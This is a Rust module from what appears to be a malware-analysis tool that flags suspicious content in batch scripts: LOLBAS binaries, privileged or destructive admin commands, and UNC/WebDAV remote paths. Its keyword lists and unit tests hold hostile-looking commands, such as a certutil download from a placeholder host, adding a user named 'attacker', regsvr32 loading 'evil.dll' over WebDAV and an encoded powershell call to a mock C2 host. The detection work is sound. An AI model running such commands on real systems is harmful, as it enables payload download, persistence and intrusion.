use std::sync::LazyLock;

use disrobe_core::ioc::{Indicator, extract_with_extra};
use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum BatchIocKind {
    Lolbas,
    AdminCommand,
    UncPath,
    WebdavPath,
}

#[derive(Debug, Clone, Serialize)]
pub struct BatchIndicator {
    pub kind: BatchIocKind,
    pub value: String,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct BatchIocReport {
    pub core: Vec<Indicator>,
    pub batch: Vec<BatchIndicator>,
}

const LOLBAS: &[&str] = &[
    "certutil",
    "bitsadmin",
    "mshta",
    "regsvr32",
    "rundll32",
    "wmic",
    "powershell",
    "pwsh",
    "cscript",
    "wscript",
    "msbuild",
    "installutil",
    "regasm",
    "regsvcs",
    "forfiles",
    "explorer",
    "esentutl",
    "expand",
    "extrac32",
    "findstr",
    "makecab",
    "msiexec",
    "odbcconf",
    "schtasks",
    "scriptrunner",
];

const ADMIN_COMMANDS: &[&str] = &[
    "net user",
    "net localgroup",
    "net group",
    "net share",
    "net use",
    "netsh",
    "sc create",
    "sc config",
    "sc start",
    "reg add",
    "reg delete",
    "vssadmin delete",
    "bcdedit",
    "wbadmin delete",
    "cipher /w",
    "takeown",
    "icacls",
    "attrib +h",
    "wevtutil cl",
    "fsutil",
];

static UNC_RE: LazyLock<Regex> =
    LazyLock::new(|| crate::regex_util::safe_regex(r#"\\\\[A-Za-z0-9._\-]+\\[^\s"'<>|]{1,256}"#));

static WEBDAV_RE: LazyLock<Regex> = LazyLock::new(|| {
    crate::regex_util::safe_regex(
        r#"(?i)\\\\[A-Za-z0-9._\-]+@(?:ssl|\d{1,5})(?:@(?:ssl|\d{1,5}))?\\[^\s"'<>|]{0,256}"#,
    )
});

#[must_use]
pub fn surface(source: &str, recovered_layers: &[&str]) -> BatchIocReport {
    let core: Vec<Indicator> = extract_with_extra(source.as_bytes(), recovered_layers);
    let mut batch: Vec<BatchIndicator> = Vec::new();
    let mut haystacks: Vec<&str> = Vec::with_capacity(1 + recovered_layers.len());
    haystacks.push(source);
    haystacks.extend_from_slice(recovered_layers);

    for hay in &haystacks {
        collect_webdav(hay, &mut batch);
        collect_unc(hay, &mut batch);
        collect_command_keywords(hay, &mut batch);
    }
    sort_indicators(&mut batch);
    BatchIocReport { core, batch }
}

fn collect_webdav(source: &str, out: &mut Vec<BatchIndicator>) {
    for m in WEBDAV_RE.find_iter(source) {
        push_unique(
            out,
            BatchIndicator {
                kind: BatchIocKind::WebdavPath,
                value: m.as_str().to_owned(),
                detail: "unc path with @ssl/@port host = webdav remote".to_owned(),
            },
        );
    }
}

fn collect_unc(source: &str, out: &mut Vec<BatchIndicator>) {
    for m in UNC_RE.find_iter(source) {
        let value: &str = m.as_str();
        if value.contains('@') {
            continue;
        }
        push_unique(
            out,
            BatchIndicator {
                kind: BatchIocKind::UncPath,
                value: value.to_owned(),
                detail: "remote share access".to_owned(),
            },
        );
    }
}

fn collect_command_keywords(source: &str, out: &mut Vec<BatchIndicator>) {
    let lower: String = source.to_ascii_lowercase();
    for admin in ADMIN_COMMANDS {
        if lower.contains(admin) {
            push_unique(
                out,
                BatchIndicator {
                    kind: BatchIocKind::AdminCommand,
                    value: (*admin).to_owned(),
                    detail: "privileged or destructive system command".to_owned(),
                },
            );
        }
    }
    for tool in LOLBAS {
        if contains_command_token(&lower, tool) {
            push_unique(
                out,
                BatchIndicator {
                    kind: BatchIocKind::Lolbas,
                    value: (*tool).to_owned(),
                    detail: "living-off-the-land binary".to_owned(),
                },
            );
        }
    }
}

fn contains_command_token(haystack: &str, token: &str) -> bool {
    let mut from: usize = 0;
    while let Some(rel) = haystack[from..].find(token) {
        let at: usize = from + rel;
        let before_ok: bool = at == 0
            || !haystack[..at]
                .chars()
                .next_back()
                .is_some_and(|c: char| c.is_ascii_alphanumeric());
        let after_idx: usize = at + token.len();
        let after_ok: bool = haystack[after_idx..]
            .chars()
            .next()
            .is_none_or(|c: char| !c.is_ascii_alphanumeric());
        if before_ok && after_ok {
            return true;
        }
        from = at + token.len();
    }
    false
}

fn push_unique(out: &mut Vec<BatchIndicator>, ind: BatchIndicator) {
    if !out
        .iter()
        .any(|i: &BatchIndicator| i.kind == ind.kind && i.value == ind.value)
    {
        out.push(ind);
    }
}

fn sort_indicators(out: &mut [BatchIndicator]) {
    out.sort_by(|a: &BatchIndicator, b: &BatchIndicator| {
        (a.kind as u8)
            .cmp(&(b.kind as u8))
            .then_with(|| a.value.cmp(&b.value))
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    use disrobe_core::ioc::IocKind;

    #[test]
    fn surfaces_lolbas_certutil() {
        let r: BatchIocReport = surface(
            "certutil -urlcache -f http://x.example.com/a.exe a.exe",
            &[],
        );
        assert!(
            r.batch
                .iter()
                .any(|i: &BatchIndicator| i.kind == BatchIocKind::Lolbas && i.value == "certutil")
        );
        assert!(r.core.iter().any(|i: &Indicator| i.kind == IocKind::Url));
    }

    #[test]
    fn surfaces_admin_command() {
        let r: BatchIocReport = surface("net user attacker P@ss /add", &[]);
        assert!(r.batch.iter().any(
            |i: &BatchIndicator| i.kind == BatchIocKind::AdminCommand && i.value == "net user"
        ));
    }

    #[test]
    fn surfaces_unc_path() {
        let r: BatchIocReport = surface("copy \\\\server\\share\\tool.exe .", &[]);
        assert!(
            r.batch
                .iter()
                .any(|i: &BatchIndicator| i.kind == BatchIocKind::UncPath)
        );
    }

    #[test]
    fn surfaces_webdav_path() {
        let r: BatchIocReport = surface("regsvr32 /s \\\\1.2.3.4@443\\davwwwroot\\evil.dll", &[]);
        assert!(
            r.batch
                .iter()
                .any(|i: &BatchIndicator| i.kind == BatchIocKind::WebdavPath)
        );
    }

    #[test]
    fn no_false_lolbas_on_substring() {
        let r: BatchIocReport = surface("echo expander tool", &[]);
        assert!(
            !r.batch.iter().any(|i: &BatchIndicator| i.value == "expand"),
            "must not flag 'expand' inside 'expander': {:?}",
            r.batch
        );
    }

    #[test]
    fn recovered_layer_iocs_surface() {
        let r: BatchIocReport = surface(
            "@echo off",
            &["powershell -enc downloaded http://c2.example.org/x"],
        );
        assert!(r.core.iter().any(|i: &Indicator| i.kind == IocKind::Url));
        assert!(
            r.batch
                .iter()
                .any(|i: &BatchIndicator| i.kind == BatchIocKind::Lolbas && i.value == "powershell")
        );
    }
}
